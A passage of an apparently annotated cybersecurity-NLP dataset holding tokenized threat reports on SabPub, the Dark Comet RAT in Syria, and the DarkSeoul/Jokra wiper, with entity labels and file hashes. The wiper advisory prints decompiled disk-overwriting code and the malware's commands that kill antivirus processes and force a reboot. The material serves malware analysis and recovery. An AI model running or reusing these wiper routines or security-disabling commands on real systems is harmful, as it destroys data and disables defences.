"On", "March", "10", ",", "2011", ",", "the", "Dalai-Lama", "released", "a", "special", "statement", "related", "to"], ["Anniversary", "of", "the", "Tibetan", "People\u2019s", "National", "Uprising", "Day", "--", "hence", "the", "name", "."], ["Properties", "field", "of", "a", "document", "used", "to", "spread", "SabPub"], ["Unfortunately", "there", "is", "little", "information", "in", "the", "doc", "files", ",", "but", "the", "Author", "field", "and", "the", "creation", "date", "are"], ["interesting", ".", "In", "particular", ",", "if", "we", "trust", "the", "creation", "date", ",", "this", "means", "the", "container", "DOC", "was", "created", "in"], ["August", "2010", "and", "it", "was", "updated", "in", "2012", "with", "the", "SabPub", "sample", ".", "This", "is", "quite", "normal", "for", "such", "attacks"], ["and", "we", "have", "seen", "it", "in", "other", "cases", ",", "for", "instance", ",", "Duqu", "."], ["We", "think", "the", "above", "facts", "show", "a", "direct", "connection", "between", "the", "SabPub", "and", "Luckycat", "APT", "attacks", ".", "We", "are"], ["pretty", "sure", "the", "SabPub", "backdoor", "was", "created", "as", "far", "back", "as", "February", "2012", "and", "was", "distributed", "via", "spearphishing", "emails", "."], ["It", "is", "also", "important", "to", "point", "that", "SabPub", "isn\u2019t", "backdoor", "MaControl", "(the", "case", "was", "described", "here)", "but", "still"], ["uses", "the", "same", "topics", "to", "trick", "victims", "into", "opening", "it", ".", "SabPub", "was", "the", "more", "effective", "attack", "because", "it"], ["remained", "undetected", "for", "almost", "two", "months", "!"], ["The", "second", "variant", "of", "SabPub", "was", "created", "in", "March", "and", "the", "attackers", "are", "using", "Java", "exploits", "to", "infect"], ["target", "Mac", "OS", "X", "machines", "."], ["SabPub", "is", "still", "an", "active", "attack", "and", "we", "expect", "the", "attackers", "will", "release", "new", "variants", "of", "the", "bot", "with", "new"], ["C2s", "over", "the", "next", "days/weeks", "."], ["To", "summarize:"], ["-", "At", "least", "two", "variants", "of", "the", "SabPub", "bot", "exist", "today", "."], ["-", "The", "earliest", "version", "of", "the", "bot", "appears", "to", "have", "been", "created", "and", "used", "in", "February", "2012", "."], ["-", "The", "malware", "is", "being", "spread", "through", "Word", "documents", "that", "exploit", "the", "CVE-2009-0563", "vulnerability", "."], ["-", "SabPub", "is", "different", "from", "MaControl", ",", "another", "bot", "used", "in", "APT", "attacks", "in", "February", "2012;", "SabPub", "was"], ["more", "effective", "because", "it", "stayed", "undetected", "for", "more", "than", "1", ".", "5", "months", "."], ["-", "the", "APT", "behind", "SabPub", "is", "active", "at", "the", "time", "of", "writing", "."], ["*", "Thanks", "to", "Aleks", "Gostev", "and", "Igor", "Soumenkov", "for", "the", "analysis", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "Dark Comet", "sent_id": 8, "pos": []}, {"old_id": "T2", "type": "Attacker", "name": "Jean-Pierre Lesueur", "sent_id": 5, "pos": [1, 2]}, {"old_id": "T3", "type": "Attacker", "name": "Syrian government", "sent_id": 9, "pos": [8, 9]}, {"old_id": "T4", "type": "MalwareCharacteristics", "name": "keylogger", "sent_id": 22, "pos": [12]}, {"old_id": "T5", "type": "Malware", "name": "Dark Comet", "sent_id": 23, "pos": [9, 10]}, {"old_id": "T6", "type": "MalwareCharacteristics", "name": "recording video and audio", "sent_id": 24, "pos": [1, 4]}, {"old_id": "T7", "type": "ExploitTargetObject", "name": "critics of the regime of Syrian President Bashar Assad", "sent_id": 32, "pos": [0, 8]}, {"old_id": "T8", "type": "Person", "name": "Osama", "sent_id": 40, "pos": []}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "activist in Damascus", "sent_id": 40, "pos": [8, 10]}, {"old_id": "T10", "type": "Malware", "name": "Blackshades", "sent_id": 74, "pos": [12]}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "Syrian activists", "sent_id": 79, "pos": [10, 11]}], "labels": [{"old_id": "R1", "r": "P2", "h": 1, "t": 0, "evidence": [5, 6, 7, 8]}, {"old_id": "R2", "r": "P23", "h": 2, "t": 0, "evidence": []}, {"old_id": "R3", "r": "P13", "h": 4, "t": 3, "evidence": []}, {"old_id": "R4", "r": "P13", "h": 4, "t": 5, "evidence": [23, 24]}, {"old_id": "R5", "r": "P18", "h": 8, "t": 7, "evidence": [40]}], "title": ["inputs/txt/201207WiredDarkComet"], "sents": [["How", "the", "Boy", "Next", "Door", "Accidentally", "Built", "a", "Syrian", "Spy"], ["Tool"], ["wired", ".", "com/2012/07/dark-comet-syrian-spy-tool/"], ["Robert", "McMillan"], ["Jean-Pierre", "Lesueur", "."], ["Photo:", "Jean-Pierre", "Lesueur"], ["Jean-Pierre", "Lesueur", "is", "in", "many", "ways", "a", "typical", "22-year-old", "computer", "geek", ".", "He", "lives", "outside"], ["of", "Paris", ",", "coding", "Java", "by", "day", "for", "a", "European", "company", "that", "processes", "airline", "tickets", ".", "He"], ["likes", "playing", "the", "piano", "and", "reading", "Stephen", "Hawking", ".", "But", "he's", "also", "the", "man", "who", "built", "Dark"], ["Comet", "\u2013", "which", "was", "recently", "used", "by", "the", "Syrian", "government", "to", "steal", "information", "from", "the"], ["computers", "of", "activists", "fighting", "to", "overthrow", "it", "."], ["Dark", "Comet", "is", "a", "software", "application", "that", "gives", "you", "remote", "control", "over", "another", "computer", ","], ["and", "Lesueur", "says", "he", "wrote", "it", "just", "to", "prove", "his", "programming", "cred", ".", "That", "meant", "sharing", "the"], ["thing", "with", "the", "rest", "of", "the", "world", ",", "and", "after", "the", "Syrian", "government", "grabbed", "the", "tool", "from", "the"], ["net", ",", "Lesueur", "found", "himself", "at", "the", "center", "of", "an", "international", "firestorm", ".", "He", "spoke", "with", "Wired"], ["Tuesday", "via", "online", "chat", "."], ["Sometimes", ",", "the", "boy", "next", "door", "can", "become", "a", "tool", "in", "a", "state-sponsored", "cyberespionage"], ["campaign", ".", "That's", "the", "power", "of", "the", "internet", "."], ["Although", "it", "was", "first", "developed", "in", "2008", ",", "Dark", "Comet", "mostly", "stayed", "under", "the", "radar", "until", "it"], ["was", "linked", "to", "Syria", "earlier", "this", "year", ".", "Although", "Lesueur", "says", "he", "never", "intended", "it", "to", "be", "used"], ["illegally", ",", "Dark", "Comet", "is", "not", "the", "type", "of", "program", "anyone", "would", "want", "to", "discover", "on", "their", "PC", "."], ["1/3"], ["In", "short", ",", "it's", "a", "silent", "spying", "machine", ".", "There's", "a", "password-stealing", "keylogger", "and", "a", "feature"], ["that", "helps", "it", "avoid", "detection", "by", "antivirus", "products", ".", "Dark", "Comet", "can", "be", "used", "for", "spying", ",", "too", ","], ["quietly", "recording", "video", "and", "audio", "from", "a", "computer", "once", "it's", "installed", "."], ["According", "to", "Lesueur", ",", "Dark", "Comet", "is", "no", "worse", "than", "other", "hacking", "tools", "such", "as", "Metasploit"], ["or", "BackTrack", "Linux", ",", "which", "can", "be", "used", "both", "by", "legitimate", "security", "testers", "and", "criminals", "to"], ["launch", "online", "attacks", "against", "computers", "and", "test", "networks", "for", "security", "flaws", "."], ["Dlshad", "Othman", "first", "learned", "about", "Dark", "Comet", "in", "December", ",", "when", "a", "Syrian", "activist", "asked"], ["him", "to", "examine", "her", "computer", "after", "losing", "access", "to", "her", "e-mail", ",", "Skype", ",", "and", "Facebook"], ["account", ".", "After", "a", "scan", ",", "Othman", "discovered", "Dark", "Comet", "sitting", "on", "the", "machine's", "hard", "drive", "."], ["Dark", "Comet", "was", "another", "tool", "in", "an", "escalating", "computer", "espionage", "campaign", "targeting"], ["critics", "of", "the", "regime", "of", "Syrian", "President", "Bashar", "Assad", ".", "\"Because", "most", "of", "the", "Syrian", "people"], ["started", "to", "use", "secure", "connections", "and", "they", "[learned", "how", "to", "bypass]", "the", "censorship", "and"], ["surveillance", "of", "the", "internet", ",", "so", "the", "regime", "found", "it\u2019s", "better", "to", "use", "Trojans", "to", "arrest", "the"], ["people", ",", "\"", "says", "Othman", ",", "a", "Syrian", "activist", "and", "computer", "specialist", "who", "is", "also", "one", "of", "the", "U", ".", "S."], ["State", "Department's", "Internet", "Freedom", "Fellows", "."], ["He", "and", "other", "activists", "believe", "that", "the", "information", "stolen", "via", "Dark", "Comet", "led", "to", "many"], ["arrests", "within", "Syria", ".", "Once", "one", "computer", "is", "infected", ",", "hackers", "use", "that", "activist's", "computer", "as"], ["a", "stepping", "stone", "to", "try", "and", "infect", "others", ",", "typically", "by", "contacting", "them", "via", "Skype", "."], ["That's", "what", "happened", "to", "\"Osama", ",", "\"", "an", "activist", "in", "Damascus", "who", "declined", "to", "give", "his", "last"], ["name", ".", "About", "five", "months", "ago", ",", "a", "doctor", "friend", "of", "his", "received", "a", "file", "via", "Skype", "that", "appeared"], ["to", "have", "something", "to", "do", "with", "medicine", "and", "the", "Syrian", "revolution", ".", "\"His", "account", "started", "to"], ["send", "this", "file", "to", "his", "contacts", "(including", "me)", "and", "as", "he", "is", "a", "doctor", ",", "many", "of", "his", "contacts"], ["trusted", "this", "file", ",", "\"", "he", "said", "."], ["Osama", "doesn't", "know", "for", "certain", "that", "his", "friend", "was", "infected", "with", "Dark", "Comet", ",", "but", "it's", "very"], ["likely", "that", "he", "was", ".", "Researchers", "say", "that", "between", "November", "and", "May", ",", "this", "was", "a", "preferred"], ["remote", "access", "tool", "of", "the", "Syrian", "regime", "."], ["Morgan", "Marquis-Boire", "\u2013", "a", "researcher", "with", "Citizen", "Lab", ",", "a", "computer", "security", "research", "thinktank", "\u2013", "has", "identified", "16", "separate", "pieces", "of", "malicious", "software", "that", "use", "Dark", "Comet", "to"], ["send", "information", "back", "to", "computers", "located", "in", "Syria", ".", "Typically", "these", "are", "Trojan", "horse"], ["programs", ",", "designed", "to", "look", "like", "legitimate", "files", "that", "activists", "would", "want", "to", "read", ".", "The"], ["Trojan", "might", "look", "like", "a", "", ".", "pdf", "file", "or", "a", "Skype", "encryption", "tool", ",", "but", "it", "silently", "installs", "Dark"], ["Comet", "in", "the", "background", ".", "Dark", "Comet", "is", "known", "as", "a", "remote", "administration", "tool", ".", "Security"], ["experts", "call", "it", "a", "RAT", "."], ["Dark", "Comet", "was", "packaged", "with", "malicious", "software", "that", "would", "quietly", "install", "it", "when"], ["victims", "opened", "this", "", ".", "pdf."], ["Image:", "John", "Scott-Railton"], ["As", "word", "of", "Dark", "Comet's", "use", "got", "out", ",", "Lesueur's", "part-time", "project", "suddenly", "came", "under", "the"], ["spotlight", ".", "The", "Electronic", "Frontier", "Foundation", ",", "antivirus", "companies", ",", "and", "online", "activists"], ["\"kept", "up", "steady", "stream", "of", "postings", "and", "reports", "of", "the", "use", "of", "Dark", "Comet", "in", "Syria", ",", "\"", "says"], ["John", "Scott-Railton", ",", "a", "doctoral", "student", "at", "UCLA", "School", "of", "Public", "Affairs", "who", "has", "worked"], ["2/3"], ["closely", "on", "the", "issue", "of", "malicious", "software", "in", "Syria", ".", "\"I", "don't", "think", "that", "this", "amount", "of"], ["pressure", "has", "ever", "been", "placed", "on", "the", "developer", "of", "a", "RAT", "before", ".", "I", "can't", "imagine", "that"], ["[Lesueur]", "expected", "anything", "like", "this", "to", "come", "from", "his", "project", ".", "\""], ["At", "first", ",", "Lesueur", "wrote", "a", "removal", "tool", ",", "so", "victims", "could", "uninstall", "Dark", "Comet", ",", "but", "he", "kept"], ["the", "project", "alive", ".", "But", "by", "the", "end", "of", "June", ",", "he", "was", "afraid", ".", "Though", "he", "wasn't", "the", "one", "doing", "the"], ["illegal", "activity", ",", "it", "was", "clear", "that", "his", "software", "was", "being", "misused", "\u2013", "not", "just", "by", "the", "Syrian"], ["government", ",", "but", "by", "untalented", "hackers", "Lesueur", "calls", "\"script-kiddies", ".", "\""], ["He", "started", "to", "worry", "about", "being", "arrested", ".", "So", "on", "June", "28", ",", "he", "took", "down", "Dark", "Comet", "", ".", "\"I"], ["removed", "all", "before", "one", "day", "it", "happened", ",", "\"", "he", "says", ".", "\"I", "don't", "want", "to", "lose", "my", "life", "for", "such", "a"], ["little", "thing", ".", "\""], ["Lesueur", "says", "the", "Syrian", "use", "was", "a", "factor", "in", "his", "decision", "to", "pull", "Dark", "Comet", ",", "but", "not", "the", "only"], ["one", ".", "He", "won't", "spell", "out", "the", "exact", "reason", "he", "was", "worried", "about", "his", "arrest", ",", "but", "two", "days"], ["earlier", ",", "one", "of", "the", "apparent", "authors", "of", "another", "remote-access", "tool", "called", "Blackshades", "was"], ["arrested", "in", "Tuscon", ",", "Arizona", ",", "on", "hacking", "and", "malware", "distribution", "charges", ".", "That", "arrest", "may"], ["have", "scared", "Lesueur", ",", "says", "Kevin", "Mitnick", ",", "a", "well-known", "information", "security", "consultant", "."], ["Lesueur", "says", "that", "it", "did", "not", "affect", "his", "decision", ".", "\"The", "Blackshades", "author", "was", "in", "charge", "of", "a"], ["carding", "operation", ",", "\"", "he", "says", ".", "\"It's", "not", "the", "same", ".", "\""], ["Blackshades", ",", "coincidentally", ",", "is", "now", "being", "used", "against", "the", "Syrian", "activists", "much", "in", "the"], ["same", "way", "that", "Dark", "Comet", "was", ",", "says", "Marquis-Boire", "."], ["Mitnick", ",", "who", "has", "used", "Dark", "Comet", "in", "security", "demonstrations", ",", "doesn't", "think", "Leseur", "should"], ["have", "abandoned", "his", "tool", "because", "it", "was", "being", "used", "illegally", ".", "\"I", "don't", "think", "that's", "a", "good"], ["reason", "to", "stop", "development", "on", "it", ",", "because", "you", "always", "have", "bad", "actors", ",", "\"", "he", "says", ".", "\"That's"], ["just", "a", "fact", "of", "life", ".", "\""], ["This", "isn't", "the", "first", "time", "that", "a", "software", "developer", "has", "dropped", "a", "tool", "after", "getting", "some"], ["heat", ".", "But", "what's", "unusual", "is", "that", "Lesueur", "has", "been", "remarkably", "candid", "about", "everything", ","], ["using", "his", "real", "name", ",", "talking", "about", "himself", "in", "detail", ",", "and", "explaining", "why", "he", "created", "the", "tool", "."], ["Lesueur", "\u2013", "who", "cut", "his", "teeth", "in", "a", "underground", "Trojan", "and", "RAT-writing", "forum", "called", "OpenSC"], ["\u2013", "says", "that", "although", "he", "made", "about", "2", ",", "000", "euros", "offering", "technical", "support", "for", "Dark", "Comet", ","], ["he", "didn't", "charge", "for", "the", "software", "and", "was", "never", "in", "it", "for", "the", "money", ".", "He's", "now", "working", "on", "a"], ["new", "remote", "access", "tool", "that", "doesn't", "include", "the", "controversial", "spying", "features", "that", "were", "in"], ["Dark", "Comet", "."], ["After", "Lesueur", "pulled", "Dark", "Comet", ",", "Kevin", "Mitnick", "asked", "him", "if", "he'd", "ever", "consider", "selling", "the"], ["source", "code", "to", "the", "tool", ".", "Lesueur", "said", "no", ".", "\"I", "don\u2019t", "think", "he", "was", "out", "for", "money", ",", "\"", "Mitnick", "says", "."], ["\"I", "don't", "think", "he", "was", "doing", "anything", "illegal", ".", "\""], ["Lesueur", "says", "he", "just", "wanted", "to", "make", "a", "name", "for", "himself", "in", "the", "hacker", "scene", ".", "\"The", "whole"], ["development", "process", "of", "Dark", "Comet", "was", "a", "challenge", "for", "myself", ",", "\"", "he", "says", "."], ["\"I", "never", "imagined", "it", "would", "be", "used", "by", "a", "government", "for", "spying", ",", "\"", "he", "said", ".", "\"If", "I", "had", "known"], ["that", ",", "I", "would", "never", "have", "created", "such", "a", "tool", ".", "\""], ["3/3"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "Darkseoul", "sent_id": 5, "pos": []}, {"old_id": "T2", "type": "Malware", "name": "Jokra", "sent_id": 5, "pos": []}, {"old_id": "T3", "type": "Time", "name": "March 21 2013", "sent_id": 6, "pos": [0, 3]}, {"old_id": "T4", "type": "Organization", "name": "Fidelis", "sent_id": 4, "pos": [0]}, {"old_id": "T5", "type": "ExploitTargetObject", "name": "South Korean broadcasting and banking infrastructure", "sent_id": 11, "pos": [6, 11]}, {"old_id": "T6", "type": "ExploitTargetObject", "name": "Saudi Aramco", "sent_id": 13, "pos": [7, 8]}, {"old_id": "T7", "type": "Malware", "name": "Shamoon", "sent_id": 13, "pos": [11]}, {"old_id": "T8", "type": "Malware", "name": "Shamoon", "sent_id": 13, "pos": [11]}, {"old_id": "T9", "type": "Indicator", "name": "HASTATI", "sent_id": 22, "pos": []}, {"old_id": "T10", "type": "Indicator", "name": "PRNCPES", "sent_id": 22, "pos": []}, {"old_id": "T11", "type": "Malware", "name": "Shamoon", "sent_id": 24, "pos": [2]}, {"old_id": "T12", "type": "Malware", "name": "DarkSeoul", "sent_id": 28, "pos": []}, {"old_id": "T13", "type": "Malware", "name": "Jokra", "sent_id": 28, "pos": []}, {"old_id": "T14", "type": "Malware", "name": "239ed75323exe", "sent_id": 31, "pos": []}, {"old_id": "T15", "type": "Malware", "name": "mb_joinexe", "sent_id": 32, "pos": []}, {"old_id": "T16", "type": "MD5", "name": "5fcd6e1dace6b0599429d913850f0364", "sent_id": 33, "pos": [0]}, {"old_id": "T17", "type": "MD5", "name": "0a8032cd6b4a710b1771a080fa09fb87", "sent_id": 34, "pos": [0]}, {"old_id": "T18", "type": "System", "name": "Windows XP", "sent_id": 57, "pos": [6, 7]}, {"old_id": "T19", "type": "Indicator", "name": "taskkill /F /IM pasvcexe", "sent_id": 104, "pos": []}, {"old_id": "T20", "type": "Indicator", "name": "taskkill /F /IM Clisvcexe", "sent_id": 105, "pos": []}, {"old_id": "T21", "type": "Indicator", "name": "shutdown -r -t 0", "sent_id": 106, "pos": []}, {"old_id": "T22", "type": "Software", "name": "ViRobot ISMS", "sent_id": 120, "pos": [6, 7]}, {"old_id": "T23", "type": "Organization", "name": "HAURI Inc", "sent_id": 120, "pos": [11, 12]}, {"old_id": "T24", "type": "Malware", "name": "Shamoon", "sent_id": 136, "pos": [5]}, {"old_id": "T25", "type": "Software", "name": "Fidelis XPS", "sent_id": 170, "pos": [0, 1]}, {"old_id": "T26", "type": "Malware", "name": "DarkSeoul", "sent_id": 170, "pos": []}, {"old_id": "T27", "type": "Malware", "name": "Jokra", "sent_id": 170, "pos": []}, {"old_id": "T28", "type": "TrojanHorse", "name": "TrojanWin32EraseMBRb", "sent_id": 171, "pos": []}], "labels": [{"old_id": "R2", "r": "P21", "h": 8, "t": 11, "evidence": [22, 23, 24, 25, 26, 27, 28]}, {"old_id": "R3", "r": "P21", "h": 9, "t": 12, "evidence": [22, 23, 24, 25, 26, 27, 28]}, {"old_id": "R1", "r": "P21", "h": 15, "t": 13, "evidence": []}, {"old_id": "R4", "r": "P21", "h": 16, "t": 14, "evidence": []}, {"old_id": "R5", "r": "P17", "h": 22, "t": 21, "evidence": [120]}], "title": ["inputs/txt/201303FidelisDarkSeoulJokra"], "sents": [["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1800", ".", "652.4020"], ["Fidelis", "Threat", "Advisory", "#1008"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"], ["March", "21", ",", "2013"], ["Document", "Status:"], ["Last", "Revised:"], ["FINAL"], ["2013-03-21"], ["A", "recent", "cyber-attack", "reported", "within", "the", "South", "Korean", "broadcasting", "and", "banking", "infrastructure"], ["reportedly", "brought", "down", "over", "35", ",", "000", "systems", ".", "This", "attack", "has", "drawn", "comparisons", "in", "intent", "and"], ["method", "to", "the", "recent", "wiping", "attack", "against", "Saudi", "Aramco", "by", "the", "Shamoon", "malware", ".", "Shamoon"], ["has", "been", "covered", "extensively", "by", "the", "community", ",", "and", "was", "covered", "in", "Fidelis", "Threat", "Advisory"], ["#1007", ".", "Naturally", "our", "curiosity", "was", "peaked", "and", "we", "acquired", "samples", "of", "the", "malware", "and", "started"], ["analysis", "."], ["The", "initial", "analysis", "has", "been", "posted", "on", "the", "Fidelis", "Threat", "Geek", "blog", "and", "will", "be", "expanded", "upon"], ["in", "this", "advisory", ".", "This", "write-up", "will", "focus", "on", "the", "wiper", "malware", "used", "and", "the", "recovery", "techniques"], ["that", "are", "possible", "."], ["From", "preliminary", "analysis", "it", "is", "known", "that", "the", "malware", "will", "overwrite", "the", "Master", "Boot", "Record"], ["(MBR)", "and", "Volume", "Boot", "Record", "(VBR)", ".", "The", "records", "and", "files", "overwritten", "by", "the", "malware", "so", "far"], ["have", "been", "wiped", "with", "patterns", "of", "'HASTATI'", "or", "'PR!NCPES\u2019", "."], ["The", "malware", "samples", "that", "have", "been", "analyzed", "by", "our", "team", "are", "different", "in", "code", "and", "function"], ["from", "the", "Shamoon", "malware", ".", "However", ",", "by", "using", "the", "same", "recovery", "methods", "found", "in", "advisory"], ["#1007", "the", "files", "and", "data", "are", "indeed", "recoverable", "."], ["Wiper", "Malware", "Overview"], ["Two", "malware", "samples", "obtained", "were", "used", "in", "the", "analysis", ".", "The", "malware", "has", "been", "named"], ["'DarkSeoul'", "and", "'Jokra'", "by", "the", "community", "."], ["Our", "samples", "have", "been", "touched", "on", "in", "our", "blog", "entry", "and", "other", "samples", "have", "been", "covered", "in"], ["blogs", "around", "the", "community", "."], ["239ed75323", ".", "exe:"], ["mb_join", ".", "exe:"], ["5fcd6e1dace6b0599429d913850f0364"], ["0a8032cd6b4a710b1771a080fa09fb87"], ["Users", "are", "granted", "permission", "to", "copy", "and/or", "distribute", "this", "document", "in", "its", "original", "electronic", "form", "and", "print", "copies", "for", "personal", "use", ".", "This"], ["document", "cannot", "be", "modified", "or", "converted", "to", "any", "other", "electronic", "or", "machine-readable", "form", "in", "whole", "or", "in", "part", "without", "prior", "written"], ["approval", "of", "Fidelis", "Security", "Systems", ",", "Inc", "."], ["While", "we", "have", "done", "our", "best", "to", "ensure", "that", "the", "material", "found", "in", "this", "document", "is", "accurate", ",", "Fidelis", "Security", "Systems", ",", "Inc", ".", "makes", "no"], ["guarantee", "that", "the", "information", "contained", "herein", "is", "error", "free", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems"], ["Threat", "Advisory", "#1008"], ["Page", "1", "of", "5"], ["Rev", ".", "2013-02-21"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1800", ".", "652.4020"], ["The", "malware", "gains", "disk", "access", "by", "opening", "the", "physical", "drive", "as", "a", "file", "."], ["Disk", "Access", "(Func", "00401d55):"], ["sprintf(filename_str", ",", "\"\\\\", ".", "\\PhysicalDrive%d\",", "0)"], ["hFile", "=", "CreateFileA(filename_str", ",", "GENERIC_READ", "|", "GENERIC_WRITE", ","], ["FILE_SHARE_READ", "|", "FILE_SHARE_WRITE", ",", "NULL", ","], ["OPEN_EXISTING", ",", "NULL)"], ["Example", "of", "the", "wiper", "opening", "the", "drive", "as", "a", "file", "."], ["The", "first", "section", "that", "the", "malware", "overwrites", "is", "located", "at", "0x7000", ".", "This", "is", "sector", "56", "and", "is"], ["normally", "the", "VBR", "location", "of", "a", "Windows", "XP", "system", ".", "It", "continues", "the", "pattern", "of", "'HASTATI'", "or"], ["'PR", "!", "NCPES\u2019'", "for", "102", ",", "400d", "bytes", "."], ["Wiper", "Selection", "(Func", "00402079):"], ["and", "[local", ".", "1],", "0"], [";(local", ".", "1->\"PR!NCPES\")"], ["mov", "esi,[arg", ".", "2]", ";arg", ".", "2", "=", "0x38", "on", "first", "call"], ["eax=0"], ["shld", "eax", ",", "esi,9"], ["mov", "edi,[arg", ".", "1]"], ["mov", "[arg", ".", "2],", "eax"], ["lea", "eax", ",", "[arg", ".", "2]"], ["shl", "esi", ",", "9"], ["SetFilePointer(hFile", ",", "esi", ",", "eax", ",", "FILE_BEGIN)", "//", "on", "first", "call", "--", "0x009efab8:0x00007000"], ["WriteFile(hFile", ",", "&arg", ".", "3,", "512", ",", "&local", ".", "1,", "NULL)"], ["Example", "of", "how", "the", "wiper", "selected", "the", "location", "to", "overwrite", "on", "the", "first", "call", "."], ["If", "this", "is", "hardcoded", "for", "0x7000", "then", "it", "will", "not", "wipe", "the", "VBR", "of", "any", "systems", "after", "and", "including"], ["Vista", ",", "as", "those", "VBR", "locations", "are", "in", "different", "areas", "."], ["During", "testing", "both", "malware", "samples", "were", "executed", "in", "a", "Windows", "7", "VM", ".", "Neither", "wiped", "the", "MBR"], ["or", "the", "VBR\u2014they", "only", "overwrote", "files", "within", "the", "file", "system\u2014but", "the", "system", "wasn't", "prevented"], ["from", "starting", "up", "."], ["The", "malware", "writes", "a", "512-byte", "pattern", "to", "the", "disk", "in", "XP", "and", "a", "1023", "byte", "pattern", "in", "Windows", "7", "."], ["Example", "of", "the", "loop", "responsible", "for", "overwriting", "the", "disk", "and", "files", "."], ["As", "observed", "during", "a", "debugging", "session", "the", "following", "screenshot", "shows", "one", "of", "the", "512-byte"], ["patterns", "it", "writes", "to", "disk:"], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems"], ["Threat", "Advisory", "#1008"], ["Page", "2", "of", "5"], ["Rev", ".", "2013-02-21"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1800", ".", "652.4020"], ["Example", "of", "overwritten", "disk"], ["The", "malware", "will", "create", "new", "threads", "for", "each", "physical", "drive", "found", "on", "the", "affected", "system", ".", "It"], ["enumerates", "and", "tries", "to", "find", "PhysicalDrive[0-9]", ".", "The", "malware", "makes", "distinctions", "based", "on", "what"], ["type", "of", "drive", "is", "detected", ",", "such", "as", "fixed", "or", "removable", "devices", ".", "As", "long", "as", "the", "drive", "is", "fixed", "a", "new"], ["thread", "is", "created", "."], ["Thread", "1", "(Func", "00401aa0):"], ["call", "func_00401d55"], ["strcpy(drive_path", ",", "\"B:\\\")"], ["", ".", ".."], ["if", "(GetDriveType(drive_path)", "==", "DRIVE_FIXED)"], ["CreateThread(NULL", ",", "0", ",", "00401B7A", ",", "0040247C", ",", "0", ",", "&tid)"], ["", ".", ".."], ["Example", "of", "the", "wiper", "finds", "fixed", "drives", "and", "create", "new", "thread", "for", "each", "drive", "."], ["The", "following", "commands", "have", "previously", "been", "reported", "in", "the", "community:"], ["\u201ctaskkill", "/F", "/IM", "pasvc", ".", "exe\u201d"], ["\u201ctaskkill", "/F", "/IM", "Clisvc", ".", "exe\u201d"], ["\"shutdown", "-r", "-t", "0\""], ["Example", "of", "commands", "run", "by", "the", "malware", "."], ["The", "first", "command", ",", "\u201ctaskkill", "/F", "/IM", "pasvc", ".", "exe\u201d,", "will", "try", "to", "kill", "a", "process", "named", "\u201cpasvc", ".", "exe\u201d.", "This"], ["process", "is", "associated", "with", "the", "AhnLab", "Policy", "Agent", "process", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems"], ["Threat", "Advisory", "#1008"], ["Page", "3", "of", "5"], ["Rev", ".", "2013-02-21"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1800", ".", "652.4020"], ["The", "second", "command", ",", "\u201ctaskkill", "/F", "/IM", "Clisvc", ".", "exe\u201d,", "will", "try", "to", "kill", "a", "process", "named", "\u201cClisvc", ".", "exe\u201d."], ["This", "process", "is", "associated", "with", "the", "ViRobot", "ISMS", "security", "tool", "from", "HAURI", "Inc", "."], ["The", "third", "command", ",", "\u201cshutdown", "-r", "-t", "0\u201d", ",", "instructs", "the", "malware", "to", "shutdown", "and", "reboot", "the", "system", "."], ["The", "malware", "shuts", "the", "system", "down", "quickly", "after", "initial", "execution", ",", "it", "was", "found", "to", "finish", "wiping", "in"], ["ten", "to", "fifteen", "minutes", "in", "our", "tests", ".", "Due", "to", "the", "speed", "of", "the", "wiping", "it", "was", "very", "easy", "to", "find", "that", "the"], ["malware", "did", "not", "actually", "wipe", "all", "the", "data", "on", "the", "computer", ".", "It", "wiped", "just", "enough", "to", "make", "the"], ["machine", "unusable", "after", "the", "operation", "was", "complete", ".", "This", "is", "notable", "and", "can", "be", "seen", "in", "the"], ["operation", "of", "the", "malware", "as", "it", "makes", "sure", "to", "overwrite", "the", "VBR", "first", "then", "continue", "overwriting", "the"], ["MBR", "and", "other", "files", "."], ["Note:", "The", "sample", "Fidelis", "Security", "Systems", "researchers", "had", "available", "looked", "very", "similar", "to", "that"], ["detailed", "in", "community", "write-ups", ".", "However", ",", "as", "of", "the", "date", "of", "this", "post", ",", "researchers", "were", "still"], ["analyzing", "the", "available", "sample", ".", "Therefore", ",", "differences", "between", "the", "available", "sample", "and", "others"], ["available", "to", "the", "community", "may", "become", "apparent", "in", "the", "future", "."], ["File", "System", "Recovery"], ["The", "following", "is", "the", "view", "of", "the", "wiped", "disk", "for", "each", "of", "the", "operating", "systems", "that", "we", "tested:"], ["Example", "of", "wiped", "MBR", "by", "the", "Malware", "."], ["The", "malware", "never", "actually", "overwrote", "the", "backup", "VBR", ".", "It", "was", "found", "that", "the", "same", "techniques"], ["utilized", "to", "recover", "data", "from", "Shamoon", "could", "be", "applied", "here", ".", "The", "recovery", "methods", "were"], ["covered", "in", "depth", "in", "Fidelis", "Threat", "Advisory", "#1007", "so", "we", "will", "not", "show", "them", "here", ".", "What", "will", "be"], ["shown", "are", "the", "results", "of", "the", "recovery", "."], ["When", "the", "backup", "VBR", "is", "found", "within", "EnCase", "(v6", ".", "19.6)", "it", "was", "possible", "to", "add", "a", "manual", "NTFS"], ["partition", "into", "the", "system", "to", "recover", "the", "file", "system", "and", "data", "within", "."], ["Copyright", "\u00a9", "2013", "General", "Dynamics", "Fidelis", "Cybersecurity", "Systems"], ["Threat", "Advisory", "#1008"], ["Page", "4", "of", "5"], ["Rev", ".", "2013-02-21"], ["Darkseoul/Jokra", "Analysis", "And", "Recovery"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1800", ".", "652.4020"], ["Example", "of", "a", "file", "system", "recovered"], ["Once", 